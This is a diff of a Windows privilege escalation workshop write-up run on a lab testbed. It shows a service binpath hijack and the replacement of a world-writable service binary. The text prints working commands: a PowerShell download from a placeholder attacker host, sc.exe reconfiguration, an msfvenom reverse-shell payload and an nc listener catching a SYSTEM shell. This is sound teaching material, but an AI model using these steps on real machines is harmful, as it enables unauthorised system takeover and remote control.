@@ -1,5 +1,3 @@
-Source material and binaries for MOST of the exercises come from here: https://github.com/sagishahar/lpeworkshop
-
 Because this is a privilege escalation workshop, we are starting with a powershell reverse shell as a low privilege user. The goal for each exercise will be to get a NEW reverse shell as the NT\System user. We want to maintain our original low privilege shell so that we can have a backup shell.
 
 Once we land on the machine, we want to get a quick look at the lay of the land. I have really been liking SharpUp from Ghostpack (https://github.com/GhostPack). SharpUp and Seatbelt are fantastic resources for enumerating privesc vectors. Let's start with SharpUp.
@@ -34,7 +32,11 @@ Then we transfer over the service file using our download logic again:
 
 (New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/daclservicehijack.exe", "C:\Users\user\Downloads\daclservicehijack.exe")
 
-Then we modify the binpath of the service: PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
+Then we modify the binpath of the service:
+
+PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
+[SC] ChangeServiceConfig SUCCESS
+
 
 Then we query to make sure our changes were successful:
 
@@ -75,6 +77,88 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 
+C:\Windows\system32>whoami & hostname
+whoami & hostname
+nt authority\system
+LPETestbed
+
+C:\Windows\system32>
+
+Next up let's tackle modifiable service binaries.
+
+=== Modifiable Service Binaries ===
+
+  Name             : filepermsvc
+  DisplayName      : File Permissions Service
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+ So there is a service binary at that path that our user has full control over. Typically application developers will give users access to the folders of their binaries when they want to ease update processes or allow users to import custom modules/code. In this case, where the binary is tied to a service that was registered as NT\System, we can overwrite that binary to achieve privilege escalation.
+ 
+ First let's verify the permissions on that file.
+ 
+ PS C:\Program Files\File Permissions Service> icacls.exe *.exe
+filepermservice.exe Everyone:(F)
+                    NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Program Files\File Permissions Service> 
+
+We can see that everyone has full control: Everyone:(F).
+
+So let's use msfvenom to generate a service binary that we can use to replace that vulnerable service:
+
+root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=31337 -f exe-service > filepermservice.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe-service file: 15872 bytes
+
+Note that we have to name it the same thing as the original service.
+
+So now we delete the original service: (Note, if the service is running, it's difficult to replace this binary. This means that you could have a startup script that would try to swap the binaries before the service started but otherwise, you are out of luck. Luckily for us, the service is NOT running.)
+
+Then we download the file to the victim.
+
+Check the service one more time:
+PS C:\Users\user\Downloads> sc.exe qc filepermsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: filepermsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : File Permissions Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+PS C:\Users\user\Downloads> 
+
+Then we start the service:
+
+PS C:\Users\user\Downloads> net start filepermsvc
+The File Permissions Service service is starting.
+PS C:\Users\user\Downloads> 
+
+We get a reverse shell as the NT\SYSTEM user:
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.98.
+Ncat: Connection from 10.22.6.98:63289.
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
 C:\Windows\system32>whoami & hostname
 whoami & hostname
 nt authority\system
